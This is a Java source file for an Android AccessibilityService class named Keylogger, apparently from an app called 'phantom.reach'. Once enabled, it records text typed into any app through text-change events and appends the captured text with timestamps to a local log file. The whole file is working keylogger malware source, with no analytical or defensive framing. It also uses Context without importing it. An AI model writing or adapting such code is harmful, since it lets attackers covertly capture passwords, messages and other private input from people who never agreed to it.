package com.phantom.reach;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Keylogger extends AccessibilityService {
    private static String logBuffer = "";
    private static boolean enabled = false;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!enabled) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            if (text != null && !text.isEmpty()) {
                logBuffer += text + "\n";
                // Write to file every 50 chars
                if (logBuffer.length() > 50) {
                    writeToFile(logBuffer);
                    logBuffer = "";
                }
            }
        }
    }
    
    public static void enable(Context ctx) {
        enabled = true;
    }
    
    public static String getLogs() {
        return logBuffer;
    }
    
    private void writeToFile(String data) {
        try {
            FileOutputStream fos = openFileOutput("logs.txt", MODE_APPEND);
            OutputStreamWriter osw = new OutputStreamWriter(fos);
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            osw.write("[" + timestamp + "] " + data);
            osw.close();
        } catch (Exception ignored) {}
    }
    
    @Override
    public void onInterrupt() {}
}